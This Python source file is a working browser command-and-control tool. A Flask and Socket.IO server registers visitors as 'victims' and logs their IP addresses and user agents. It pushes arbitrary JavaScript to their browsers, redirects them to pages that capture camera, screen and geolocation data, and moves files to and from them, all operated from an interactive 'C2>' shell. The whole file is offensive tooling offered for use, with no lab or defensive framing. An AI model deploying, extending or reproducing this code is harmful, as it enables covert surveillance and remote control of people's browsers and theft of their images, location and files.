from flask import Flask, request, jsonify, render_template, send_from_directory
from flask_socketio import SocketIO, emit
import os
import uuid
from datetime import datetime, timedelta
import threading
import cmd
import requests
import json
from colorama import Fore, init, Style
import webbrowser

# Initialize colorama
init(autoreset=True)

# Flask Application Setup
app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key-here'
socketio = SocketIO(app, cors_allowed_origins="*")

# Data Storage
victims = {}
geo_data = {}
screen_frames = {}
commands = {}
command_responses = {}
last_seen = {}
file_storage = {}

def update_last_seen(victim_id):
    last_seen[victim_id] = datetime.utcnow()

# --------------------------
# Flask Routes and Handlers
# --------------------------

@app.route("/")
def index():
    victim_id = str(uuid.uuid4())
    victims[victim_id] = {
        'registered_at': datetime.utcnow().isoformat(),
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent')
    }
    update_last_seen(victim_id)
    return render_template("index.html", victim_id=victim_id)

@app.route("/<page>.html")
def serve_page(page):
    if page not in ['camera', 'geo', 'screenshare']:
        return "Page not found", 404
    
    victim_id = request.args.get("victim")
    if not victim_id:
        return "Missing victim ID", 400
    
    update_last_seen(victim_id)
    return render_template(f"{page}.html", victim_id=victim_id)

@app.route("/api/camera_frame", methods=["POST"])
def api_camera_frame():
    return handle_media_upload("camera")

@app.route("/api/geo", methods=["POST"])
def api_geo():
    victim_id = request.args.get("victim")
    if not victim_id:
        return jsonify({"error": "Victim ID is required"}), 400

    update_last_seen(victim_id)
    data = request.get_json()
    
    geo_data[victim_id] = {
        'lat': data.get("lat"),
        'lon': data.get("lon"),
        'timestamp': datetime.utcnow().isoformat()
    }
    
    socketio.emit('geo_update', {'victim_id': victim_id, **geo_data[victim_id]}, namespace='/admin')
    return jsonify({"status": "ok"})

@app.route("/api/screen_frame", methods=["POST"])
def api_screen_frame():
    return handle_media_upload("screens")

def handle_media_upload(folder):
    victim_id = request.args.get("victim")
    if not victim_id:
        return jsonify({"error": "Victim ID is required"}), 400

    update_last_seen(victim_id)
    frame = request.data
    
    os.makedirs(folder, exist_ok=True)
    file_path = os.path.join(folder, f"{victim_id}.jpg")
    
    with open(file_path, "wb") as f:
        f.write(frame)

    socketio.emit(f'{folder}_update', {'victim_id': victim_id}, namespace='/admin')
    return jsonify({"status": "ok"})

@app.route("/api/victims", methods=["GET"])
def api_victims():
    result = []
    now = datetime.utcnow()

    for victim_id, data in victims.items():
        seen = last_seen.get(victim_id)
        status = "Offline"
        last_seen_str = None
        
        if seen:
            diff = now - seen
            if diff < timedelta(minutes=5):
                status = "Online"
            last_seen_str = seen.isoformat()

        result.append({
            "id": victim_id,
            "status": status,
            "last_seen": last_seen_str,
            "ip": data.get('ip'),
            "user_agent": data.get('user_agent')
        })

    return jsonify(result)

@app.route("/api/execute", methods=["POST"])
def api_execute():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "No data provided"}), 400
            
        victim_id = data.get("victim_id")
        command = data.get("command")
        
        if not victim_id or not command:
            return jsonify({"error": "victim_id and command are required"}), 400

        if victim_id not in victims:
            return jsonify({"error": "Victim not found"}), 404

        command_id = str(uuid.uuid4())
        cmd_data = {
            "command_id": command_id,
            "command": command,
            "status": "pending",
            "timestamp": datetime.utcnow().isoformat(),
            "source": data.get("source", "unknown")
        }

        if victim_id not in commands:
            commands[victim_id] = []
        commands[victim_id].append(cmd_data)

        # Send via WebSocket
        socketio.emit('execute_command', cmd_data, room=victim_id, namespace='/victim')

        return jsonify({
            "status": "success",
            "command_id": command_id,
            "method": "websocket" if victim_id in socketio.server.manager.rooms['/victim'] else "polling"
        })

    except Exception as e:
        return jsonify({
            "status": "error",
            "error": str(e)
        }), 500

@app.route("/api/poll_commands", methods=["GET"])
def poll_commands():
    victim_id = request.args.get("victim_id")
    if not victim_id or victim_id not in victims:
        return jsonify({"error": "Victim not found"}), 404

    update_last_seen(victim_id)
    pending = [cmd for cmd in commands.get(victim_id, []) if cmd['status'] == 'pending']
    return jsonify({"commands": pending})

@app.route("/api/command_response", methods=["POST"])
def api_command_response():
    data = request.get_json()
    victim_id = data.get("victim_id")
    command_id = data.get("command_id")
    response = data.get("response")
    
    if not all([victim_id, command_id, response]):
        return jsonify({"error": "Missing parameters"}), 400

    # Update command status
    for cmd in commands.get(victim_id, []):
        if cmd['command_id'] == command_id:
            cmd['status'] = 'completed'
            cmd['response'] = response
            cmd['completed_at'] = datetime.utcnow().isoformat()
            break
    
    if victim_id not in command_responses:
        command_responses[victim_id] = {}
    command_responses[victim_id][command_id] = response
    
    socketio.emit('command_response', data, namespace='/admin')
    return jsonify({"status": "response_received"})

@app.route("/api/upload", methods=["POST"])
def api_upload():
    victim_id = request.form.get("victim_id")
    if not victim_id:
        return jsonify({"error": "Victim ID is required"}), 400

    if 'file' not in request.files:
        return jsonify({"error": "No file provided"}), 400

    file = request.files['file']
    if file.filename == '':
        return jsonify({"error": "No selected file"}), 400

    os.makedirs("uploads", exist_ok=True)
    file_path = os.path.join("uploads", f"{victim_id}_{file.filename}")
    file.save(file_path)
    
    if victim_id not in file_storage:
        file_storage[victim_id] = []
    file_storage[victim_id].append(file.filename)
    
    return jsonify({"status": "success", "filename": file.filename})

@app.route("/api/download", methods=["GET"])
def api_download():
    victim_id = request.args.get("victim_id")
    filename = request.args.get("filename")
    
    if not victim_id or not filename:
        return jsonify({"error": "Missing parameters"}), 400
    
    file_path = os.path.join("uploads", f"{victim_id}_{filename}")
    if not os.path.exists(file_path):
        return jsonify({"error": "File not found"}), 404
    
    return send_from_directory("uploads", f"{victim_id}_{filename}", as_attachment=True)

# WebSocket Handlers
@socketio.on('connect', namespace='/victim')
def handle_victim_connect():
    victim_id = request.args.get('victim_id')
    if not victim_id:
        return False
    
    print(f"[+] Victim connected via WebSocket: {victim_id}")
    update_last_seen(victim_id)
    
    # Send pending commands
    for cmd in commands.get(victim_id, []):
        if cmd['status'] == 'pending':
            emit('execute_command', cmd)

@socketio.on('command_response', namespace='/victim')
def handle_command_response(data):
    victim_id = data.get('victim_id')
    command_id = data.get('command_id')
    response = data.get('response')
    
    if not all([victim_id, command_id, response]):
        return
    
    # Update command status
    for cmd in commands.get(victim_id, []):
        if cmd['command_id'] == command_id:
            cmd['status'] = 'completed'
            cmd['response'] = response
            cmd['completed_at'] = datetime.utcnow().isoformat()
            break
    
    if victim_id not in command_responses:
        command_responses[victim_id] = {}
    command_responses[victim_id][command_id] = response
    
    emit('command_response', data, namespace='/admin', broadcast=True)
    print(f"[+] Response received from {victim_id} for command {command_id}")

@socketio.on('connect', namespace='/admin')
def handle_admin_connect():
    print("[+] Admin dashboard connected via WebSocket")

# --------------------------
# Command Line Interface
# --------------------------

class JSShell(cmd.Cmd):
    prompt = f"{Fore.YELLOW}JS> {Style.RESET_ALL}"

    def __init__(self, c2cli, victim_id):
        super().__init__()
        self.c2cli = c2cli
        self.victim_id = victim_id
        self.buffer = []
        self.multiline = False

    def default(self, line):
        if line.strip().endswith('"""'):
            if self.multiline:
                self.buffer.append(line[:-3].strip())
                js_code = '\n'.join(self.buffer)
                self._execute_js(js_code)
                self.buffer = []
                self.multiline = False
                self.prompt = f"{Fore.YELLOW}JS> {Style.RESET_ALL}"
            else:
                self.multiline = True
                self.prompt = f"{Fore.YELLOW}... {Style.RESET_ALL}"
        elif self.multiline:
            self.buffer.append(line)
        else:
            cleaned_line = line.strip()
            if not cleaned_line.endswith(';') and not any(x in cleaned_line for x in ['{', '}', 'function']):
                line += ';'
            self._execute_js(line)

    def _execute_js(self, code):
        try:
            response = requests.post(
                f"{self.c2cli.server_url}/api/execute",
                json={
                    'victim_id': self.victim_id,
                    'command': code,
                    'source': 'shell'
                },
                timeout=5
            )

            if response.status_code == 200:
                print(f"{Fore.GREEN}✓ Command executed on victim's browser{Style.RESET_ALL}")
                try:
                    result = response.json()
                    if 'result' in result:
                        print(f"{Fore.CYAN}↳ {result['result']}{Style.RESET_ALL}")
                except:
                    pass
            else:
                print(f"{Fore.RED}✗ Server returned status: {response.status_code}{Style.RESET_ALL}")

        except Exception as e:
            print(f"{Fore.RED}✗ Connection error: {str(e)}{Style.RESET_ALL}")

    def do_exit(self, arg):
        """Exit the JS shell"""
        if self.multiline:
            print(f"{Fore.RED}✗ Finish multiline input first (use \"\"\"){Style.RESET_ALL}")
            return False
        return True

    def do_clear(self, arg):
        """Clear the screen"""
        os.system('cls' if os.name == 'nt' else 'clear')

class C2CLI(cmd.Cmd):
    prompt = f"{Fore.CYAN}C2>{Style.RESET_ALL} "

    def __init__(self):
        super().__init__()
        self.server_url = "http://localhost:5000"
        self.selected_victim = None
        self.command_history = []
        self.last_victims_list = []

    def _time_ago(self, last_seen):
        if not last_seen:
            return "Never"
        
        try:
            last_seen_dt = datetime.fromisoformat(last_seen)
        except ValueError:
            try:
                last_seen_dt = datetime.strptime(last_seen, "%Y-%m-%d %H:%M:%S")
            except:
                return str(last_seen)

        diff = datetime.utcnow() - last_seen_dt
        seconds = int(diff.total_seconds())

        intervals = (
            ('d', 86400),
            ('h', 3600),
            ('m', 60),
            ('s', 1)
        )

        for unit, div in intervals:
            if seconds >= div:
                return f"{seconds // div}{unit} ago"
        return "Just now"

    def do_list(self, arg):
        """List connected victims"""
        try:
            response = requests.get(f"{self.server_url}/api/victims")
            response.raise_for_status()
            victims = response.json()
            self.last_victims_list = victims
        except Exception as e:
            print(f"{Fore.RED}✗ Failed to fetch victims: {e}{Style.RESET_ALL}")
            return

        print(f"\n{Fore.YELLOW}{'No.':<5}{'ID':<36}{'Status':<10}{'Last Seen':<20}{Style.RESET_ALL}")
        print(f"{'-'*75}")
        for idx, v in enumerate(victims, 1):
            status = f"{Fore.GREEN}Online" if v['status'] == 'Online' else f"{Fore.RED}Offline"
            last_seen_str = self._time_ago(v.get('last_seen'))
            print(f"{Fore.CYAN}{idx:<5}{v['id']:<36}{status:<10}{Fore.MAGENTA}{last_seen_str}{Style.RESET_ALL}")
        print("")

    def do_select(self, arg):
        """Select victim by number from the last list command"""
        if not self.last_victims_list:
            print(f"{Fore.RED}✗ No victims list found. Run 'list' first.{Style.RESET_ALL}")
            return

        try:
            idx = int(arg)
            if idx < 1 or idx > len(self.last_victims_list):
                print(f"{Fore.RED}✗ Invalid selection number{Style.RESET_ALL}")
                return
        except ValueError:
            print(f"{Fore.RED}✗ Please provide a valid number{Style.RESET_ALL}")
            return

        victim = self.last_victims_list[idx - 1]
        self.selected_victim = victim['id']
        print(f"{Fore.GREEN}✓ Selected victim #{idx}: {self.selected_victim}{Style.RESET_ALL}")
        self.do_info('')

    def do_shell(self, arg):
        """Open interactive JavaScript shell"""
        if not self.selected_victim:
            print(f"{Fore.RED}✗ Select victim first{Style.RESET_ALL}")
            return

        print(f"\n{Fore.CYAN}=== JS Shell ({self.selected_victim}) ==={Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Tip:{Style.RESET_ALL} Use \"\"\" for multi-line input")
        print(f"{Fore.YELLOW}Type 'exit' to return\n{Style.RESET_ALL}")

        JSShell(self, self.selected_victim).cmdloop()

    def do_info(self, arg):
        """Show victim details"""
        if not self.selected_victim:
            print(f"{Fore.RED}✗ No victim selected{Style.RESET_ALL}")
            return

        try:
            response = requests.get(f"{self.server_url}/api/victims")
            response.raise_for_status()
            victims = response.json()
        except Exception as e:
            print(f"{Fore.RED}✗ Failed to fetch victims: {e}{Style.RESET_ALL}")
            return

        victim = next((v for v in victims if v['id'] == self.selected_victim), None)
        if victim:
            print(f"\n{Fore.CYAN}=== Victim Info ==={Style.RESET_ALL}")
            print(f"ID: {victim['id']}")
            print(f"Status: {Fore.GREEN if victim['status'] == 'Online' else Fore.RED}{victim['status']}{Style.RESET_ALL}")
            print(f"Last Seen: {self._time_ago(victim.get('last_seen'))}")
            print(f"IP: {victim.get('ip', 'Unknown')}")
            print(f"User Agent: {victim.get('user_agent', 'Unknown')}")
        else:
            print(f"{Fore.RED}✗ Victim not found{Style.RESET_ALL}")

    def do_cmd(self, js_code):
        """Execute custom JS command"""
        if not self.selected_victim:
            print(f"{Fore.RED}✗ No victim selected{Style.RESET_ALL}")
            return

        if not js_code:
            print(f"{Fore.RED}✗ Please provide JS code{Style.RESET_ALL}")
            return

        try:
            response = requests.post(
                f"{self.server_url}/api/execute",
                json={
                    'victim_id': self.selected_victim,
                    'command': js_code,
                    'source': 'cmd'
                },
                timeout=5
            )
            
            if response.status_code == 200:
                print(f"{Fore.GREEN}✓ Command sent successfully{Style.RESET_ALL}")
                try:
                    print(json.dumps(response.json(), indent=2))
                except:
                    pass
            else:
                print(f"{Fore.RED}✗ Server returned status: {response.status_code}{Style.RESET_ALL}")
                print(f"Response: {response.text}")
                
        except Exception as e:
            print(f"{Fore.RED}✗ Connection error: {str(e)}{Style.RESET_ALL}")

    def do_geo(self, arg):
        """Get victim location"""
        self._execute_service('geo')

    def do_camera(self, arg):
        """Capture victim camera"""
        self._execute_service('camera')

    def do_screenshare(self, arg):
        """Capture victim screen"""
        self._execute_service('screenshare')

    def do_upload(self, arg):
        """Upload file to victim"""
        if not self.selected_victim:
            print(f"{Fore.RED}✗ No victim selected{Style.RESET_ALL}")
            return

        if not os.path.exists(arg):
            print(f"{Fore.RED}✗ File not found{Style.RESET_ALL}")
            return

        try:
            with open(arg, 'rb') as f:
                response = requests.post(
                    f"{self.server_url}/api/upload",
                    files={'file': f},
                    data={'victim_id': self.selected_victim},
                    timeout=10
                )
            
            if response.status_code == 200:
                print(f"{Fore.GREEN}✓ File uploaded successfully{Style.RESET_ALL}")
                print(json.dumps(response.json(), indent=2))
            else:
                print(f"{Fore.RED}✗ Upload failed: {response.status_code}{Style.RESET_ALL}")
                print(f"Response: {response.text}")
                
        except Exception as e:
            print(f"{Fore.RED}✗ Error: {str(e)}{Style.RESET_ALL}")

    def do_download(self, arg):
        """Download file from victim"""
        if not self.selected_victim:
            print(f"{Fore.RED}✗ No victim selected{Style.RESET_ALL}")
            return

        try:
            response = requests.get(
                f"{self.server_url}/api/download",
                params={'victim_id': self.selected_victim, 'filename': arg},
                timeout=10
            )

            if response.status_code == 200:
                os.makedirs('downloads', exist_ok=True)
                with open(f"downloads/{arg}", 'wb') as f:
                    f.write(response.content)
                print(f"{Fore.GREEN}✓ File saved to downloads/{arg}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}✗ Download failed: {response.status_code}{Style.RESET_ALL}")
                print(f"Response: {response.text}")
                
        except Exception as e:
            print(f"{Fore.RED}✗ Error: {str(e)}{Style.RESET_ALL}")

    def do_history(self, arg):
        """Show command history"""
        for idx, cmd in enumerate(self.command_history[-10:], 1):
            print(f"{idx}. {cmd}")

    def do_clear(self, arg):
        """Clear the screen"""
        os.system('cls' if os.name == 'nt' else 'clear')

    def do_exit(self, arg):
        """Exit the CLI"""
        print(f"{Fore.YELLOW}Exiting...{Style.RESET_ALL}")
        return True

    def _execute_service(self, service):
        if not self.selected_victim:
            print(f"{Fore.RED}✗ No victim selected{Style.RESET_ALL}")
            return

        link = f"{self.server_url}/{service}.html?victim={self.selected_victim}"
        js_code = f"window.location.href='{link}'"
        
        try:
            response = requests.post(
                f"{self.server_url}/api/execute",
                json={
                    'victim_id': self.selected_victim,
                    'command': js_code,
                    'source': 'service'
                },
                timeout=5
            )
            
            if response.status_code == 200:
                print(f"{Fore.GREEN}✓ Command sent successfully{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[➤] Direct link: {link}{Style.RESET_ALL}")
                try:
                    webbrowser.open(link)
                except:
                    pass
            else:
                print(f"{Fore.RED}✗ Failed to send command{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}✗ Error: {str(e)}{Style.RESET_ALL}")

    def precmd(self, line):
        self.command_history.append(line)
        return line

    def preloop(self):
        print(f"{Fore.CYAN}Advanced C2 CLI - Type 'help' for commands{Style.RESET_ALL}")

# --------------------------
# Main Execution
# --------------------------

def run_flask_app():
    socketio.run(app, host="0.0.0.0", port=5000, debug=False, use_reloader=False)

if __name__ == '__main__':
    # Start Flask server in a separate thread
    flask_thread = threading.Thread(target=run_flask_app)
    flask_thread.daemon = True
    flask_thread.start()

    # Start CLI
    C2CLI().cmdloop()
